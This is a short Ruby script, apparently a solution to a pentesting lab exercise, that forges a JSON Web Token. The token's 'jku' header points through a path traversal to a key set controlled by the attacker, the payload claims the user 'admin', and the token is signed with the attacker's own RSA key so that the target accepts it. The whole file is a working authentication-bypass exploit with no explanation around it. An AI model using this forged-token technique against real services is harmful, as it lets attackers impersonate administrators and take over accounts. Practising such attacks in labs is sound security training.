require 'openssl'
require 'base64'
require 'json'


header = {"typ":"JWT","alg":"RS256",\
          "jku":"http://ptl-37b1f6d4-c0f8bd20.libcurl.so/.well-known/../21419892-6ae8-4a2a-9394-18f628a9c15d.json"}
payload = {"user":"admin"}

priv = OpenSSL::PKey::RSA.new File.read 'private.pem'
pub = priv.public_key

n = Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
e = Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/,"")

#puts e
#puts n

token = Base64.urlsafe_encode64(header.to_json).gsub(/=+$/,"")
token+= "."+Base64.urlsafe_encode64(payload.to_json).gsub(/=+$/,"")

sign = priv.sign("SHA256", token)
token+= "."+Base64.urlsafe_encode64(sign).gsub(/=+$/,"")

puts token

